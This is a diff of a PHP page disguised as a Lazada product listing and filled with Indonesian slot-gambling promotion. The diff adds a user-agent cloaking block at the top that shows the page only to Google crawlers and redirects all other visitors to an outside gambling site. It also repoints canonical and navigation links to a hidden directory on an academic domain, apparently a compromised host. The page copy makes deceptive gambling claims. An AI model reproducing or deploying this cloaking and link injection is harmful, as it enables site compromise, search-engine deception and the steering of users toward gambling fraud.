@@ -1,4 +1,16 @@
 <?php
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+if (strpos($userAgent, 'Googlebot') !== false || 
+    strpos($userAgent, 'Google-Site-Verification') !== false || 
+    strpos($userAgent, 'Google-InspectionTool') !== false) {
+} else {
+    header("Location: https://lanciaolu.me/mekihitam");
+    exit();
+}
+?>
+
+<?php
 
 function feedback404()
 {
@@ -50,14 +62,14 @@ if (isset($_GET['pafi'])) {
   <meta name="aplus-auto-exp" content='[{"filter":"exp-tracking=suggest-official-store","logkey":"/lzdse.result.os_impr","props":["href"],"tag":"a"}]' />
   <meta name="data-spm" content="a2o4j" />
   <meta name="robots" content="index, follow" />
-  <meta name="og:url" content="https://www.seadogsushibar.com/" />
+  <meta name="og:url" content="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>" />
   <meta name="og:title" content="<?php echo $BRAND; ?>: Link Situs Slot Gacor Online Server Luar Negeri" />
   <meta name="og:type" content="product" />
   <meta name="og:description" content="Mainkan situs slot gacor online gampang menang Hanya Di <?php echo $BRAND; ?>. Nikmati slot luar negeri dengan garansi kekalahan, Temukan Slot77 Sekarang!" />
   <meta name="og:image" content="https://raw.githubusercontent.com/CallMeBatosay/Backup/refs/heads/main/slotgacor.webp" />
   <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
   <link rel="icon" type="image/x-icon" href="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
-  <link rel="canonical" href="https://www.seadogsushibar.com/" />
+  <link rel="canonical" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>" />
   <link rel="amphtml" href="https://angkasaungu.com/" />
   <!-- start preload -->
   <link rel="preload" href="https://raw.githubusercontent.com/CallMeBatosay/Backup/refs/heads/main/slotgacor.webp" as="image" />
@@ -703,7 +715,7 @@ if (isset($_GET['pafi'])) {
     "image":"//id-test-11.slatic.net/p/c08a6637647b6984097e3fcf63c97c3c.jpg",
     "category":"Televisi & Video",
     "brand":{"@type":"Brand","name":"Samsung",
-    "url":"https://www.seadogsushibar.com/"},
+    "url":"https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>"},
     "sku":"3642482616_ID-6108584955",
     "mpn":3642482616,
     "description":"Mainkan situs slot gacor online gampang menang Hanya Di <?php echo $BRAND; ?>. Nikmati slot luar negeri dengan garansi kekalahan, Temukan Slot77 Sekarang!",
@@ -724,35 +736,35 @@ if (isset($_GET['pafi'])) {
           "@type": "ListItem",
           "position": 1,
           "item": {
-            "@id": "https://www.seadogsushibar.com/",
+            "@id": "https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>",
             "name": "<?php echo $BRAND; ?>"
           }
         }, {
           "@type": "ListItem",
           "position": 2,
           "item": {
-            "@id": "https://www.seadogsushibar.com/",
+            "@id": "https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>",
             "name": "Link Slot Gacor"
           }
         }, {
           "@type": "ListItem",
           "position": 3,
           "item": {
-            "@id": "https://www.seadogsushibar.com/",
+            "@id": "https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>",
             "name": "Situs Slot Gacor"
           }
         }, {
           "@type": "ListItem",
           "position": 4,
           "item": {
-            "@id": "https://www.seadogsushibar.com/",
+            "@id": "https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>",
             "name": "Rekomendasi Slot Gacor"
           }
         }, {
           "@type": "ListItem",
           "position": 5,
           "item": {
-            "@id": "https://www.seadogsushibar.com/",
+            "@id": "https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>",
             "name": "<?php echo $BRAND; ?>: Link Situs Slot Gacor Online Server Luar Negeri"
           }
         }]
@@ -852,7 +864,7 @@ if (isset($_GET['pafi'])) {
                     <a class="highlight" target="_blank" href="//yida.alibaba-inc.com/alibaba/web/APP_NZEYXSPGPBMKO7Z1LCE5/inst/homepage/?spm=a2o42.home.header.d0.654346b5QeptXc#/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d0">INTERNAL FEEDBACK</a>
                 </div>
                   <div class="top-links-item" id="topActionFeedback">
-                      <a class="highlight" target="_blank" href="https://www.seadogsushibar.com/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback" style="color: #99cc00;"><?php echo $BRAND; ?></a>
+                      <a class="highlight" target="_blank" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>" data-spm-click="gostr=/lzdpub.header.tbar;locaid=dfeedback" style="color: #99cc00;"><?php echo $BRAND; ?></a>
                   </div>
                     <div class="top-links-item orange" id="topActionDownload" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d1">
                         <span style="color: #99cc00;">LINK SLOT GACOR</span>
@@ -903,7 +915,7 @@ if (isset($_GET['pafi'])) {
 </div>
                     </div>
                 <div class="top-links-item" id="topActionSell">
-                    <a class="cyan" href="https://www.seadogsushibar.com/" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d2" style="color: #99cc00;">SITUS SLOT GACOR</a>
+                    <a class="cyan" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d2" style="color: #99cc00;">SITUS SLOT GACOR</a>
                 </div>
                     <div class="top-links-item" id="topActionCustomCare" data-spm-click="gostr=/lzdpub.header.tbar;locaid=d3">
                       <span style="color: #99cc00;">REKOMENDASI SLOT GACOR</span>
@@ -1026,7 +1038,7 @@ if (isset($_GET['pafi'])) {
         </div>
         <div class="lzd-logo-bar">
           <div class="logo-bar-content header-content">
-              <div class="lzd-logo-content"><a href="https://www.seadogsushibar.com/" data-spm="dhome"><img src="https://i.ibb.co.com/qJ57jvk/1337seo.png" alt="Logo <?php echo $BRAND; ?>"></a></div>
+              <div class="lzd-logo-content"><a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>" data-spm="dhome"><img src="https://i.ibb.co.com/qJ57jvk/1337seo.png" alt="Logo <?php echo $BRAND; ?>"></a></div>
               <div class="lzd-nav-search " data-spm="search">
                 <div id="button" data-spm-click="gostr=/lzdpub.header.search;locaid=d_go"></div>
               </div>
@@ -1035,7 +1047,7 @@ if (isset($_GET['pafi'])) {
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="https://www.seadogsushibar.com/">
+            <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -2070,26 +2082,26 @@ if (isset($_GET['pafi'])) {
             </div>
         </div>
         <nav class="lzd-menu-labels" data-spm="menu">
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="<?php echo $BRAND; ?>" class="lzd-site-nav-menu-iconfont-img" src="img/">
                 </span>
                 <span class="lzd-menu-labels-item-text"><?php echo $BRAND; ?></span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="SLOT <?php echo $BRAND; ?>" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
 
                         <span class="lzd-menu-labels-item-text">SITUS SLOT77</span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="Voucher &amp;" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
                         <span class="lzd-menu-labels-item-text">SITUS SLOT ONLINE</span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="SLOT <?php echo $BRAND; ?>" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
@@ -2110,7 +2122,7 @@ if (isset($_GET['pafi'])) {
 <div class="lzd-site-nav-menu lzd-site-nav-menu-active" data-mod-name="@ali/lzdmod-site-menu-nav-pc/pc/index" data-config="{}">
     <div class="lzd-site-menu-nav-container">
         <div class="lzd-site-menu-nav-category">
-            <a href="https://www.seadogsushibar.com/">
+            <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-menu-nav-category-text">Kategori</span>
             </a>
             <div class="lzd-site-menu-nav-menu">
@@ -3145,27 +3157,27 @@ if (isset($_GET['pafi'])) {
             </div>
         </div>
         <nav class="lzd-menu-labels" data-spm="menu">
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="<?php echo $BRAND; ?>" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
                 <span class="lzd-menu-labels-item-text">SLOT <?php echo $BRAND; ?></span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="Pulsa &amp;" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
                 <!--<i class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon lazada-ic-channel-MobileTop1">&#xe768;</i>-->
                         <span class="lzd-menu-labels-item-text">SITUS SLOT77</span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="SITUS SLOT ONLINE" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
                         <span class="lzd-menu-labels-item-text">SITUS SLOT ONLINE
                         </span>
             </a>
-            <a class="lzd-menu-labels-item" href="https://www.seadogsushibar.com/">
+            <a class="lzd-menu-labels-item" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">
                 <span class="lzd-site-nav-menu-iconfont lzd-menu-labels-item-icon">
                     <img alt="<?php echo $BRAND; ?>" class="lzd-site-nav-menu-iconfont-img" src="https://png.pngtree.com/png-clipart/20230101/original/pngtree-lightning-icon-design-png-image_8843910.png">
                 </span>
@@ -3439,10 +3451,10 @@ if (!lzdDocCookies.getItem('t_uid')) {
 
   </div>
   <div id="container" style="visibility: visible;">
-    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="<?php echo $BRAND; ?>: Link Situs Slot Gacor Online Server Luar Negeri" src="https://raw.githubusercontent.com/CallMeBatosay/Backup/refs/heads/main/slotgacor.webp"/></div></div><a href="https://asalan.xyz/daftarpafi" rel="nofollow noopener" target="_blank"><img src="https://community.hubspot.com/t5/image/serverpage/image-id/101705iEE66A42BC2D68DB7/image-size/large/is-moderation-mode/true?v=v2&px=999" width="100%" height="auto" alt=""></a><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" lazada_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title"><?php echo $BRAND; ?>: Link Situs Slot Gacor Online Server Luar Negeri</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">10.895.013 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://www.seadogsushibar.com/"><?php echo $BRAND; ?></a><div class="pdp-product-brand__divider"></div><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://asalan.xyz/loginpafi"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">LOGIN </span></button></a><a href="https://asalan.xyz/daftarpafi" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR SEKARANG </span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price">
-        <p>Apakah kamu suka dengan permainan slot online? Jika demikian maka kamu sudah menuju situs slot gacor yang tepat! Di <a href="https://www.seadogsushibar.com/"><?php echo $BRAND; ?></a>, kami merupakan salah satu pengembang situs slot77 yang memiliki afiliasi dengan semua provider tergacor, dan juga kami merupakan salah satu pemegang lisensi dari pengembang game terbaik di Indonesia. Hanya dengan klik tab pada menu slot kami, Kamu akan menemukan lebih dari 30 provider games <a href="https://www.seadogsushibar.com/">slot gacor</a> favorit seperti Pragmatic Play, PG SOFT, Slot77, Slot88.</p>
+    <div id="root" class="pdp-block" data-reactroot=""><div id="module_core" class="pdp-block module"><p></p></div><div id="block-r3bZB9J63C" class="pdp-block pdp-block_group_buy_tip"><div id="module_group_buy_tip" class="pdp-block module"></div></div><div id="block-9uUVSSMxTb" class="pdp-block pdp-block__main-information"><div id="block-W59OjAyxSy" class="pdp-block pdp-block__gallery"><div id="module_item_gallery_1" class="pdp-block module"><div class="item-gallery" data-spm="gallery"><div class="gallery-preview-panel"><div class="gallery-preview-panel__content"><img class="pdp-mod-common-image gallery-preview-panel__image" alt="<?php echo $BRAND; ?>: Link Situs Slot Gacor Online Server Luar Negeri" src="https://raw.githubusercontent.com/CallMeBatosay/Backup/refs/heads/main/slotgacor.webp"/></div></div><a href="https://asalan.xyz/daftarpafi" rel="nofollow noopener" target="_blank"><img src="https://community.hubspot.com/t5/image/serverpage/image-id/101705iEE66A42BC2D68DB7/image-size/large/is-moderation-mode/true?v=v2&px=999" width="100%" height="auto" alt=""></a><div class="next-slick next-slick-outer next-slick-horizontal item-gallery-slider"><div class="next-slick-inner next-slick-initialized" draggable="true"><div class="next-slick-list"><div class="next-slick-track"><div style="outline:none;width:52px" class="next-slick-slide next-slick-active next-slick-cloned item-gallery__thumbnail item-gallery__thumbnail_state_active" lazada_pdp_gallery_tpp_track="gallery" main_image_number="1" data-index="0" tabindex="-1"><div class="item-gallery__image-wrapper"></div></div></div></div><div data-role="none" class="next-slick-arrow next-slick-prev outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-left next-icon-medium"></i></div><div data-role="none" class="next-slick-arrow next-slick-next outer medium horizontal disabled" style="display:block"><i class="next-icon next-icon-arrow-right next-icon-medium"></i></div></div></div></div></div></div><div id="block-n8THsmEaVS" class="pdp-block pdp-block__main-information-detail"><div id="block-6QhDn4z1db" class="pdp-block"><div id="block-ssuYrXSucaM" class="pdp-block pdp-block__product-detail"><div id="module_flash_sale" class="pdp-block module"></div><div id="module_crazy_deal" class="pdp-block module"></div><div id="module_redmart_top_promo_banner" class="pdp-block module"></div><div id="module_product_title_1" class="pdp-block module"><div class="pdp-product-title"><div class="pdp-mod-product-badge-wrapper"><h1 class="pdp-mod-product-badge-title"><?php echo $BRAND; ?>: Link Situs Slot Gacor Online Server Luar Negeri</h1></div></div></div><div id="module_pre-order-tag" class="pdp-block module"></div><div id="block-C7wdxsrWYA0" class="pdp-block pdp-block__rating-questions-summary"><div id="block-qkzkCPtx4vZ" class="pdp-block pdp-block__rating-questions"><div id="module_product_review_star_1" class="pdp-block module"><div class="pdp-review-summary"><div class="container-star pdp-review-summary__stars pdp-stars_size_s"><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/><img class="star" src="https://i.gyazo.com/7b17449b7b047a1f1a859a29ec996e97.png"/></div><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-review-summary__link" data-spm-anchor-id="a2o4j.pdp_revamp.0.0">10.895.013 Penilaian</a></div></div></div><div id="block-ztlO6gvyRIv" class="pdp-block pdp-block__share"><div id="block--PRjoF98du4" class="pdp-block" style="display:inline-block;width:24px;height:54px"><div id="module_product_share_1" class="pdp-block module"></div></div><div id="block-7fC8S_Z8DDj" class="pdp-block" style="display:inline-block"><div id="module_product_wishlist_1" class="pdp-block module"><p></p></div></div></div></div><div id="module_product_brand_1" class="pdp-block module"><div class="pdp-product-brand"><span class="pdp-product-brand__name">Merek<!-- -->:<!-- --> </span><a class="pdp-link pdp-link_size_s pdp-link_theme_blue pdp-product-brand__brand-link" target="_self" href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>"><?php echo $BRAND; ?></a><div class="pdp-product-brand__divider"></div><div class="pdp-cart-concern" bis_skin_checked="1"><a href="https://asalan.xyz/loginpafi"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_yellow pdp-button_size_xl" data-spm-anchor-id="a2o4j.pdp_revamp.0.i0.241073bdeHYO5j"><span class="pdp-button-text">LOGIN </span></button></a><a href="https://asalan.xyz/daftarpafi" target="_blank"><button class="add-to-cart-buy-now-btn  pdp-button pdp-button_type_text pdp-button_theme_orange pdp-button_size_xl"><span class="pdp-button-text"><span class="">DAFTAR SEKARANG </span></span></button></a><form method="post" action=""><input name="buyParams" type="hidden" value="{&quot;items&quot;:[{&quot;itemId&quot;:&quot;3642482616&quot;,&quot;skuId&quot;:&quot;6108584955&quot;,&quot;quantity&quot;:1,&quot;attributes&quot;:null}]}"></form></div></div></div><div id="module_product_attrs" class="pdp-block module"></div><div id="block-cKVxLtoIbl2" class="pdp-block module"></div><div id="module_product_price_1" class="pdp-block module"><div class="pdp-mod-product-price">
+        <p>Apakah kamu suka dengan permainan slot online? Jika demikian maka kamu sudah menuju situs slot gacor yang tepat! Di <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>"><?php echo $BRAND; ?></a>, kami merupakan salah satu pengembang situs slot77 yang memiliki afiliasi dengan semua provider tergacor, dan juga kami merupakan salah satu pemegang lisensi dari pengembang game terbaik di Indonesia. Hanya dengan klik tab pada menu slot kami, Kamu akan menemukan lebih dari 30 provider games <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">slot gacor</a> favorit seperti Pragmatic Play, PG SOFT, Slot77, Slot88.</p>
 
-        <p><?php echo $BRAND; ?> dan Slot77 menjadi <a href="https://www.seadogsushibar.com/">situs slot</a> terlengkap yang sudah memberikan akses kemudahan bagi semua pemain yang ingin menikmati permainan slot luar negeri yang memiliki garansi kekalahan 100 terbaik. Dengan bergabung di situs slot gacor sini anda akan mendapatkan taruhan yang aman dan mudah untuk dimainkan. Galaxy 77 sudah menyediakan berbagai macam permainan slot online yang dapat diakses dengan mudah dan cepat menggunakan semua jenis handphone dan berbagai perangkat termasuk komputer.</p>
+        <p><?php echo $BRAND; ?> dan Slot77 menjadi <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">situs slot</a> terlengkap yang sudah memberikan akses kemudahan bagi semua pemain yang ingin menikmati permainan slot luar negeri yang memiliki garansi kekalahan 100 terbaik. Dengan bergabung di situs slot gacor sini anda akan mendapatkan taruhan yang aman dan mudah untuk dimainkan. Galaxy 77 sudah menyediakan berbagai macam permainan slot online yang dapat diakses dengan mudah dan cepat menggunakan semua jenis handphone dan berbagai perangkat termasuk komputer.</p>
         
         
         <p><?php echo $BRAND; ?> merupakan agen slot resmi yang memiliki visi dan misi selalu memberikan layanan permainan yang terbaik. Jadi para pengguna kami merupakan prioritas utama. Di sini pemain akan mendapatkan pilihan game yang beragam yang sangat menarik untuk diakses. <?php echo $BRAND; ?> telah menyediakan beragam layanan yang maksimal dan juga permainan slot gacor dengan server luar negeri terbaik secara online. Dengan melakukan deposit yang sangat murah yaitu 30.000 tentu membuat anda bisa terhubung dengan segala jenis permainan yang menyenangkan. Sehingga dengan menggunakan modal kecil semua kalangan bisa mengakses berbagai permainannya. Buat Anda yang tidak ingin melewatkan kesempatan terbaik ini segera daftarkan secara gratis hanya di situs slot online <?php echo $BRAND; ?>. Mainkan segala permainan menariknya sekarang juga dengan mudah.</p>
@@ -3729,10 +3741,10 @@ if (!lzdDocCookies.getItem('t_uid')) {
           <a href="//group.lazada.com/en/press-release/">Press &amp; Media</a>
       </li>
       <li class="footer-li">
-          <a href="https://www.seadogsushibar.com/">Jual Di Lazada</a>
+          <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">Jual Di Lazada</a>
       </li>
       <li class="footer-li">
-          <a href="https://www.seadogsushibar.com/">Lazada Security</a>
+          <a href="https://stpn.ac.id/.tmb/?pafi=<?php echo $BRAND; ?>">Lazada Security</a>
       </li>
       <li class="footer-li">
           <a href="https://pages.lazada.co.id/wow/gcp/route/lazada/id/upr_1000345_lazada/channel/id/upr-router/id_upr?hybrid=1&amp;data_prefetch=true&amp;prefetch_replace=1&amp;at_iframe=1&amp;wh_pid=/lazada/channel/id/legal/ipr-policy">Intellectual Property Protection</a>
